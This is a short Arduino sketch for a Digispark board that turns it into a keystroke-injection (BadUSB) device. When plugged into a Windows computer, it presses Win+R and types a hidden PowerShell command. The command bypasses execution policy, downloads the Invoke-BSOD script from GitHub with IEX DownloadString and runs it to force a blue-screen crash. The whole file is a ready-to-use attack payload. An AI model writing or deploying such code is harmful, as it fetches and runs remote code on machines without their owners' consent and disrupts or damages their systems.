#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  
  // Blink LED 3 times as warning
  for (int i = 0; i < 3; i++) {
    DigiKeyboard.delay(500);
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(500);
    digitalWrite(1, LOW);
  }

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Press WIN + R to open Run dialog
  DigiKeyboard.delay(100);
  
  // Send the new PowerShell command to bypass execution policy and run the script
  DigiKeyboard.println("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1')); Invoke-BSOD\"");
  
  DigiKeyboard.delay(500);

  digitalWrite(1, HIGH); // turn on LED when program finishes - You can unplug now
  while(1); // Stop execution
}
